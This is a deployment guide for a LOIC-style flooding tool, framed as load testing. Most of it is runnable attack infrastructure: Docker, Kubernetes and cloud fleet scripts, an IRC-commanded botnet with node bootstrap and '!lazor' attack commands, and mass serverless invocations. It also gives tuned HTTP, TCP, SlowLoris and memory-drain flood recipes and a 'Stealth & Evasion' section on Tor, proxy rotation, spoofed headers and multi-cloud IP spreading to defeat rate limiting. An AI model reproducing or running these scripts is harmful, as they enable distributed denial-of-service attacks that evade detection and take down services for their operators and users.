# DEPLOYMENT GUIDE

Effective stress testing at scale requires distributed deployment. One machine can
find the cracks; 100 machines can blow them wide open. This guide covers every
practical deployment topology.

---

## 1. Single Machine: Baselining

Before scaling out, establish what one machine can achieve. This gives you a
multiplier metric.

```bash
# Install
git clone https://github.com/NewEraCracker/LOIC.git
cd LOIC
pip install -e .

# Baseline test against a dummy endpoint
loic --target-ip <local-test-server> --method http --port 80 \
     --threads 500 --duration 30 --output baseline.json

# Extract peak req/sec
jq '.summary.peak_req_per_sec' baseline.json
```

A mid-range cloud VM (4 vCPU, 8GB RAM) typically pushes **8,000-15,000 HTTP req/sec**
depending on network latency. A bare-metal machine with tuned kernel parameters can
push **30,000-50,000 req/sec**.

Use this number: `target_req_per_sec / baseline_req_per_sec = machines_needed`.

---

## 2. Kernel Tuning (Every Machine)

Before deploying at scale, tune each machine's kernel to handle massive socket
turnover. Run this on **every** node:

```bash
cat >> /etc/sysctl.conf <<EOF

# Increase ephemeral port range
net.ipv4.ip_local_port_range = 1024 65535

# Recycle TIME_WAIT sockets faster
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_fin_timeout = 15
net.ipv4.tcp_tw_recycle = 0          # deprecated, leave off
net.ipv4.tcp_max_tw_buckets = 2000000

# Increase connection tracking table
net.netfilter.nf_conntrack_max = 1048576
net.nf_conntrack_max = 1048576

# Backlog and socket buffers
net.core.somaxconn = 65535
net.core.netdev_max_backlog = 65535
net.ipv4.tcp_max_syn_backlog = 65535
net.core.rmem_max = 16777216
net.core.wmem_max = 16777216
net.ipv4.tcp_rmem = 4096 87380 16777216
net.ipv4.tcp_wmem = 4096 65536 16777216

# Disable slow start after idle (hurts persistent connections)
net.ipv4.tcp_slow_start_after_idle = 0

# File descriptor limit
fs.file-max = 2097152
fs.nr_open = 2097152

# Increase ARP table
net.ipv4.neigh.default.gc_thresh2 = 4096
net.ipv4.neigh.default.gc_thresh3 = 8192
EOF

sysctl -p

# Raise per-process fd limit
cat >> /etc/security/limits.conf <<EOF
* soft nofile 1048576
* hard nofile 1048576
root soft nofile 1048576
root hard nofile 1048576
EOF

# Apply immediately (or relogin)
ulimit -n 1048576
```

Skip this step and you'll hit `Too many open files` within seconds of launching.

---

## 3. Docker Deployment

The fastest way to spin up multiple instances. Build once, run anywhere.

### Dockerfile
```dockerfile
FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential \
    && rm -rf /var/lib/apt/lists/*

# Kernel tuning needs to happen on the HOST, not in the container.
# The container inherits the host's ulimit, so tune the host first.

WORKDIR /app
COPY loic/ loic/
COPY pyproject.toml .

RUN pip install --no-cache-dir -e .
RUN pip install --no-cache-dir aiohttp  # optional: faster HTTP lib

ENTRYPOINT ["loic"]
CMD ["--help"]
```

### Build and run
```bash
docker build -t loic:v2 .
docker run --rm --network host loic:v2 \
    --target-ip 10.0.0.1 --method http --threads 500 --duration 60
```

**Critical:** Use `--network host` mode. Docker's default NAT bridge adds
latency and limits port exhaustion. Host mode gives you raw network performance.

### Docker Compose: 10 instances on one host
```yaml
# docker-compose.yml
version: "3.8"
services:
  loic:
    build: .
    network_mode: host
    deploy:
      replicas: 10
    command:
      - "--target-ip=10.0.0.1"
      - "--method=http"
      - "--threads=100"
      - "--duration=120"
      - "--ramp-up=30"
      - "--quiet"
```

```bash
docker compose up --scale loic=10 --detach
docker compose logs -f    # watch aggregated output
```

---

## 4. Kubernetes Deployment

For cloud-native scale. A `DaemonSet` puts one pod on every node; a `Deployment`
lets you control replica count independently.

### DaemonSet (one per node, node count = instance count)
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: loic
spec:
  selector:
    matchLabels:
      app: loic
  template:
    metadata:
      labels:
        app: loic
    spec:
      hostNetwork: true       # bypass k8s overlay network
      dnsPolicy: ClusterFirstWithHostNet
      containers:
      - name: loic
        image: loic:v2
        imagePullPolicy: IfNotPresent
        args:
          - "--target-url=api.target.example"
          - "--port=443"
          - "--method=http"
          - "--tls"
          - "--threads=200"
          - "--rate-limit=100"
          - "--ramp-up=60"
          - "--duration=600"
          - "--quiet"
        resources:
          requests:
            cpu: "2"
            memory: "512Mi"
          limits:
            cpu: "4"
            memory: "1Gi"
        securityContext:
          capabilities:
            add: ["NET_RAW", "NET_ADMIN"]
      terminationGracePeriodSeconds: 15
```

```bash
kubectl apply -f daemonset.yaml

# Scale the cluster horizontally (adds nodes + pods)
gcloud container clusters resize my-cluster --num-nodes=20

# When done
kubectl delete daemonset loic
```

### Deployment with TTL (self-destructing)
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: loic-ephemeral
spec:
  replicas: 50
  selector:
    matchLabels:
      app: loic
  template:
    metadata:
      labels:
        app: loic
    spec:
      hostNetwork: true
      dnsPolicy: ClusterFirstWithHostNet
      containers:
      - name: loic
        image: loic:v2
        args:
          - "--target-ip=10.0.0.1"
          - "--method=http"
          - "--threads=300"
          - "--duration=300"
          - "--output=/dev/null"
          - "--quiet"
      restartPolicy: Never      # pod dies when finished, don't respawn
```

```bash
# Launch a 50-pod fleet that self-destructs after 5 minutes
kubectl apply -f deployment-ttl.yaml

# Live scale up during the test
kubectl scale deployment loic-ephemeral --replicas=200

# Everything dies automatically when duration expires
```

---

## 5. HiveMind: IRC-Coordinated Botnet

The original LOIC's signature feature. One IRC channel acts as a command
post. Every node connects and waits for orders.

### Architecture
```
                 ┌──────────┐
                 │ IRC      │
           ┌────►│ Server   │◄────┐
           │     │ #chaos   │     │
           │     └──────────┘     │
           │                      │
    ┌──────┴──────┐        ┌──────┴──────┐
    │ Node 1 (US) │  ...   │ Node N (EU) │
    │ loic --hive │        │ loic --hive │
    └─────────────┘        └─────────────┘
           │                      │
           ▼                      ▼
    ┌──────────────┐      ┌──────────────┐
    │   TARGET     │◄─────│   TARGET     │
    └──────────────┘      └──────────────┘
```

### Node bootstrap script
```bash
#!/bin/bash
# deploy-node.sh — run on every node
cd /opt/loic
git pull origin main
pip install -e . --quiet

# Fire and forget as a systemd service
cat > /etc/systemd/system/loic-hive.service <<EOF
[Unit]
Description=LOIC HiveMind Node
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/loic \
    --hivemind \
    --irc-server irc.internal.example \
    --irc-port 6697 \
    --irc-channel "#chaos" \
    --quiet
Restart=always
RestartSec=10
LimitNOFILE=1048576

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now loic-hive
```

### Command post usage
```bash
# Connect to IRC as an operator
irssi -c irc.internal.example -p 6697 -n operator

# Join channel, get ops
/join #chaos
/msg chanserv op #chaos operator

# Configure all nodes (they parse the topic)
/topic !lazor targetip=10.0.0.1 method=http port=443 tls=true threads=500

# Arm them
/msg #chaos !lazor start

# Later, reconfigure and attack again
/topic !lazor targetip=10.0.1.1 method=http port=80 threads=200 sockspthread=100

# Stop everything
/msg #chaos !lazor stop

# Reset all nodes to defaults
/msg #chaos !lazor default
```

### IRC Security
- Run an **internal-only** IRC server (InspIRCd, UnrealIRCd). Never use public IRC for this.
- Use SSL/TLS (`--irc-port 6697`).
- Set a channel password so random users can't join.
- Use SASL or operator authentication to control who can send `!lazor` commands.
- Consider a VPN overlay (WireGuard) between nodes and IRC server.

### IRC server quickstart (Docker)
```bash
docker run -d --name ircd \
    -p 6667:6667 -p 6697:6697 \
    inspircd/inspircd-docker

# Then point your nodes at it:
loic --hivemind --irc-server <docker-host> --irc-port 6667 --irc-channel "#ops"
```

---

## 6. Ephemeral Cloud Fleet

Spin up 100 VMs across regions, attack, terminate. All infrastructure,
no lasting footprint.

### AWS (EC2 Spot Fleet)
```bash
#!/bin/bash
# launch-fleet.sh
# Uses spot instances for minimum cost. Charges per second.

AMI_ID="ami-0c55b159cbfafe1f0"   # Amazon Linux 2
INSTANCE_TYPE="c6i.large"         # compute-optimized, good networking
KEY_NAME="loic-test-key"
SECURITY_GROUP="sg-xxxxxxxx"
SUBNET_IDS="subnet-a,subnet-b,subnet-c"  # multi-AZ
TARGET_IP="10.0.0.1"
TARGET_PORT="443"
THREADS="500"
DURATION="300"

USER_DATA=$(cat <<EOF | base64
#!/bin/bash
yum update -y
yum install -y python3 python3-pip git

# Kernel tuning
sysctl -w net.ipv4.ip_local_port_range="1024 65535"
sysctl -w net.ipv4.tcp_tw_reuse=1
sysctl -w net.ipv4.tcp_fin_timeout=15
ulimit -n 1048576

# Clone and install
git clone https://github.com/NewEraCracker/LOIC.git /opt/loic
cd /opt/loic
pip3 install -e .

# Attack
loic --target-ip ${TARGET_IP} --port ${TARGET_PORT} \
     --method http --tls --threads ${THREADS} \
     --duration ${DURATION} --quiet &

# Self-terminate after duration + 10s buffer
sleep $(( ${DURATION} + 10 ))
INSTANCE_ID=\$(curl -s http://169.254.169.254/latest/meta-data/instance-id)
REGION=\$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
aws ec2 terminate-instances --region \$REGION --instance-ids \$INSTANCE_ID
EOF
)

# Request 100 spot instances
aws ec2 request-spot-fleet --spot-fleet-request-config '{
  "IamFleetRole": "arn:aws:iam::123456789012:role/aws-ec2-spot-fleet-tagging-role",
  "TargetCapacity": 100,
  "AllocationStrategy": "lowestPrice",
  "InstanceInterruptionBehavior": "terminate",
  "Type": "request",
  "LaunchTemplateConfigs": [{
    "LaunchTemplateSpecification": {
      "LaunchTemplateName": "loic-spot-template",
      "Version": "$Latest"
    },
    "Overrides": [
      {"InstanceType": "c6i.large", "SubnetId": "subnet-a"},
      {"InstanceType": "c6i.xlarge", "SubnetId": "subnet-a"},
      {"InstanceType": "c7i.large", "SubnetId": "subnet-b"}
    ]
  }]
}'
```

**Cost:** 100 × c6i.large spot instances at ~$0.04/hr/instance = **$4/hr or ~$0.33 for a 5-minute attack**.

### GCP (Compute Engine Preemptible)
```bash
gcloud compute instances bulk create \
    --name-pattern="loic-####" \
    --count=50 \
    --zone=us-central1-a,us-central1-b,us-east1-b \
    --machine-type=c2-standard-4 \
    --preemptible \
    --image-family=ubuntu-2204-lts \
    --image-project=ubuntu-os-cloud \
    --metadata-from-file startup-script=user-data.sh \
    --tags=loic-fleet \
    --async
```

### DigitalOcean (lowest friction)
```bash
# doctl compute droplet create loic-{1..20} \
#     --size s-2vcpu-4gb \
#     --image ubuntu-22-04-x64 \
#     --region nyc1 \
#     --user-data-file user-data.sh \
#     --wait
```

---

## 7. Multi-Region Orchestration

Attacking from one region proves your CDN works. Attacking from 5 regions
simultaneously proves it actually works.

```bash
#!/bin/bash
# multi-region.sh

REGIONS=("us-east-1" "eu-west-1" "ap-southeast-1" "sa-east-1" "ap-northeast-1")
TARGET="api.global-app.example"
PORT="443"
THREADS="100"
DURATION="120"

for REGION in "${REGIONS[@]}"; do
    (
        export AWS_DEFAULT_REGION="$REGION"
        aws ec2 run-instances \
            --region "$REGION" \
            --image-id ami-xxxx \
            --instance-type c6i.large \
            --key-name loic-key \
            --security-group-ids sg-xxxx \
            --count 10 \
            --user-data "$(cat <<END
#!/bin/bash
git clone https://github.com/NewEraCracker/LOIC.git /opt/loic
cd /opt/loic && pip3 install -e .
loic --target-url ${TARGET} --port ${PORT} --method http --tls \
     --threads ${THREADS} --duration ${DURATION} --quiet &
END
)"
    ) &
done
wait
echo "Fleet launched across ${#REGIONS[@]} regions"
```

This sends coordinated traffic from 5 continents simultaneously. If your app
uses latency-based routing (Route 53), each region hits a different backend
cluster. You can test them all at once.

---

## 8. The Nuclear Option: Serverless + Ephemeral

Unlimited scale with zero permanent infrastructure. Every invocation is a
short burst LOIC instance.

### AWS Lambda (for HTTP GET floods only)
```python
# lambda_function.py
import asyncio
import json
from loic.attack import AttackEngine
from loic.config import AttackConfig
from loic.protocol import Protocol

engine = AttackEngine()

def lambda_handler(event, context):
    config = AttackConfig(
        target_ip=event["target_ip"],
        port=event.get("port", 443),
        method=Protocol.HTTP,
        threads=event.get("threads", 50),
        use_tls=True,
        duration=event.get("duration", 14),   # Lambda 15s max
        quiet=True,
    )

    asyncio.get_event_loop().run_until_complete(engine.start(config))
    # Lambda freezes here until duration expires or timeout

    s = engine.get_stats()
    return {"requested": s.requested, "downloaded": s.downloaded, "failed": s.failed}
```

```bash
# Fire 1000 concurrent Lambda invocations
for i in $(seq 1 1000); do
    aws lambda invoke \
        --function-name loic-attack \
        --payload '{"target_ip":"10.0.0.1","threads":50,"duration":14}' \
        --invocation-type Event \
        /dev/null &
done
```

**Limitations:** Lambda has 15-minute max duration and 6MB payload limits. Good
for burst floods, not for sustained attacks.

### GCP Cloud Run Jobs (up to 60 minutes)
```yaml
# cloud-run-job.yaml
apiVersion: run.googleapis.com/v1
kind: Job
metadata:
  name: loic-job
spec:
  template:
    spec:
      template:
        spec:
          containers:
          - image: loic:v2
            args:
              - "--target-ip=TARGET_IP"
              - "--method=http"
              - "--tls"
              - "--threads=300"
              - "--duration=1800"    # 30 min
              - "--quiet"
            resources:
              limits:
                cpu: "4"
                memory: "2Gi"
```

```bash
# Launch 50 parallel jobs, each running 30 minutes
gcloud run jobs create loic-wave-1 --image=loic:v2 --args=...
for i in $(seq 1 50); do
    gcloud run jobs execute loic-wave-1 --region=us-central1 --wait &
done
```

---

## 9. Performance Tuning by Attack Type

### HTTP flood: maximize req/sec
```bash
# Small thread count, zero delay, no response reading
loic --target-ip 10.0.0.1 --method http --port 80 \
     --threads 10 --delay 0 --no-wait --use-get \
     --subsite /health    # shortest possible endpoint

# Expected: 15,000-50,000 req/sec per machine
```

### TCP connection flood: maximize socket count
```bash
# Many threads, each with persistent sockets
loic --target-ip 10.0.0.1 --method tcp --port 80 \
     --threads 500 --delay 10000 --no-wait

# Keepalive: hold sockets open without sending data
echo 300 > /proc/sys/net/ipv4/tcp_keepalive_time
echo 60 > /proc/sys/net/ipv4/tcp_keepalive_intvl
```

### SlowLoris: maximize concurrent connections
```bash
# Many sockets per thread, long timeouts
loic --target-ip 10.0.0.1 --method slowloris --port 80 \
     --threads 5 --socks-per-thread 200 --timeout 60 --delay 100

# Tuning for maximum sockets:
# echo 2000000 > /proc/sys/net/ipv4/tcp_max_tw_buckets
# echo "1024 65535" > /proc/sys/net/ipv4/ip_local_port_range
```

### ReCoil: maximize memory drain
```bash
# Find a dynamic endpoint that returns >50KB
loic --target-ip 10.0.0.1 --method recoil --port 80 \
     --socks-per-thread 100 --threads 10 --timeout 20 \
     --subsite "/api/report?from=2020-01-01&to=2025-01-01"

# Tuning: set small recv buffer to force server buffering
# The code already uses 16-byte reads in ReCoil mode
```

---

## 10. Stealth & Evasion

If your test target has defenses, these techniques reduce detection surface:

### IP rotation via proxy chain
```bash
# Use Tor for IP diversity (slow but anonymous)
torify loic --target-ip 10.0.0.1 --method http --threads 5 --duration 60

# Or rotate through a pool of SOCKS5 proxies
for proxy in $(cat proxies.txt); do
    PROXY_HOST=$(echo $proxy | cut -d: -f1)
    PROXY_PORT=$(echo $proxy | cut -d: -f2)
    # Use proxychains wrapper
    echo "socks5 $PROXY_HOST $PROXY_PORT" >> /tmp/proxychains.conf
    proxychains4 -f /tmp/proxychains.conf loic \
        --target-ip 10.0.0.1 --method http --threads 5 --quiet &
done
```

### Distributed IP space
```bash
# Deploy across 20+ /24 subnets (different cloud providers, regions)
# Each VM gets a unique IP. The target sees thousands of distinct source IPs.
# This defeats IP-based rate limiting.

# Multi-cloud deployment:
# AWS:    20 VMs × us-east-1
# GCP:    20 VMs × us-central1 + 20 VMs × europe-west1
# DO:     20 VMs × nyc1 + 20 VMs × sgp1
# Linode: 20 VMs × eu-west
# = 120 VMs, ~120 distinct /24 source IPs
```

### Request randomization
```bash
loic --target-url api.example.com --method http --tls \
     --random \                           # random URL suffix per request
     --header "User-Agent: $(curl -s https://user-agents.net/random)" \
     --header "X-Forwarded-For: $(printf '%d.%d.%d.%d' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))" \
     --jitter 50 \                        # random timing
     --rate-limit 300                     # don't spike, just saturate
```

### HTTP/2 multiplexing
LOIC v2 uses HTTP/1.1 raw sockets by default. For HTTP/2 (harder to detect,
looks like legitimate browser traffic):
```bash
pip install httpx

# Then use a wrapper script:
python3 -c "
import asyncio, httpx
async def flood(url, n):
    async with httpx.AsyncClient(http2=True) as c:
        tasks = [c.get(url) for _ in range(n)]
        await asyncio.gather(*tasks)
asyncio.run(flood('https://api.example.com/data', 10000))
"
```

---

## 11. Full Orchestration Script

A complete deployment script that provisions infrastructure, executes the test,
captures metrics, and tears everything down.

```bash
#!/bin/bash
set -euo pipefail

# CONFIGURATION
TARGET_URL="https://api.staging.example.com/health"
THREADS_PER_NODE=400
NODES=50
DURATION=300
CLOUD="aws"
SSH_KEY="~/.ssh/loic-test.pem"
OUTPUT_DIR="./results/$(date +%Y%m%d-%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "=== PHASE 1: Provision $NODES nodes ==="
case $CLOUD in
    aws)
        aws ec2 run-instances \
            --image-id ami-0c55b159cbfafe1f0 \
            --count $NODES \
            --instance-type c6i.large \
            --key-name loic-test-key \
            --security-group-ids sg-allow-outbound \
            --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=loic-fleet}]' \
            --user-data "$(sed "s|TARGET_URL|$TARGET_URL|;s|THREADS|$THREADS_PER_NODE|;s|DURATION|$DURATION|" user-data.template.sh | base64)" \
            > "$OUTPUT_DIR/launch.json"
        ;;
    gcp)
        gcloud compute instances bulk create \
            --name-pattern="loic-####" --count=$NODES \
            --zone=us-central1-a,us-central1-b,us-central1-c \
            --machine-type=c2-standard-4 --preemptible \
            --metadata-from-file startup-script=user-data.sh \
            --async > "$OUTPUT_DIR/launch.log"
        ;;
esac

echo "=== PHASE 2: Wait for nodes to boot & attack ==="
echo "Nodes booting... waiting for attack to complete."
echo "Sleeping for $(( DURATION + 120 )) seconds (duration + boot time)"
sleep $(( DURATION + 120 ))

echo "=== PHASE 3: Collect metrics ==="
case $CLOUD in
    aws)
        INSTANCE_IDS=$(aws ec2 describe-instances \
            --filters "Name=tag:Name,Values=loic-fleet" "Name=instance-state-name,Values=running" \
            --query "Reservations[*].Instances[*].InstanceId" --output text)
        for ID in $INSTANCE_IDS; do
            IP=$(aws ec2 describe-instances --instance-ids "$ID" \
                --query "Reservations[0].Instances[0].PublicIpAddress" --output text)
            scp -i "$SSH_KEY" -o StrictHostKeyChecking=no \
                "ec2-user@$IP:/tmp/loic-results.json" "$OUTPUT_DIR/node-${ID}.json" 2>/dev/null || true
        done
        ;;
esac

echo "=== PHASE 4: Aggregate results ==="
python3 -c "
import json, glob, sys
files = glob.glob('$OUTPUT_DIR/node-*.json')
total_req = total_fail = 0
for f in files:
    try:
        d = json.load(open(f))
        s = d.get('summary', {})
        total_req += s.get('total_requested', 0)
        total_fail += s.get('total_failed', 0)
    except: pass
elapsed = $DURATION
print(f'Nodes reporting: {len(files)}')
print(f'Total requests:  {total_req}')
print(f'Total failed:    {total_fail}')
print(f'Success rate:    {(total_req-total_fail)/max(total_req,1)*100:.1f}%')
print(f'Avg req/sec:     {total_req/max(elapsed,1):.1f}')
" | tee "$OUTPUT_DIR/summary.txt"

echo "=== PHASE 5: Teardown ==="
read -p "Terminate all nodes? [y/N] " confirm
if [[ "$confirm" =~ ^[Yy]$ ]]; then
    case $CLOUD in
        aws)
            aws ec2 terminate-instances --instance-ids $INSTANCE_IDS
            ;;
        gcp)
            gcloud compute instances delete loic-* --quiet
            ;;
    esac
    echo "Fleet terminated."
fi

echo "Results in: $OUTPUT_DIR/"
```

---

## 12. Pre-Deployment Checklist

Before launching:

```
□ Target ownership or written authorization confirmed
□ All stakeholders notified of test window
□ Monitoring dashboards open (CloudWatch, Datadog, Grafana)
□ Kill switch mechanism tested (Ctrl+C, IRC !lazor stop, kubectl delete)
□ Kernel tuned on all nodes (sysctl.conf applied, ulimit raised)
□ Ephemeral port range sufficient (1024-65535)
□ DNS resolution working (target resolves from all regions)
□ Duration limit set (no infinite attacks without manual oversight)
□ Metrics export path configured
□ Log aggregation ready (if using fleet, ship logs to a central place)
□ Rollback plan: if the target degrades, how do you abort instantly?
```

---

## 13. Post-Mortem Analysis

After the test, correlate LOIC metrics with your infrastructure metrics:

```bash
# Merge all node JSONs into one timeline
python3 <<'PY'
import json, glob
from collections import defaultdict

timeline = defaultdict(lambda: {"req": 0, "fail": 0})
for path in glob.glob("results/*/node-*.json"):
    data = json.load(open(path))
    for snap in data.get("history", []):
        t = int(snap["timestamp"])
        timeline[t]["req"] += snap["requested"]
        timeline[t]["fail"] += snap["failed"]

with open("merged_timeline.json", "w") as f:
    json.dump(dict(sorted(timeline.items())), f, indent=2)
print(f"Merged {len(timeline)} data points")
PY

# Now overlay with your system metrics:
# - CPU/Memory spikes (when did backends start choking?)
# - ALB 5xx count (when did ALB start returning errors?)
# - DB connection count (when did the connection pool exhaust?)
# - Lambda throttles (when did concurrency cap hit?)
```

The merged timeline tells you at what `req/sec` threshold your system begins
to degrade. That number is your capacity ceiling. Size your autoscaling
buffer around it.
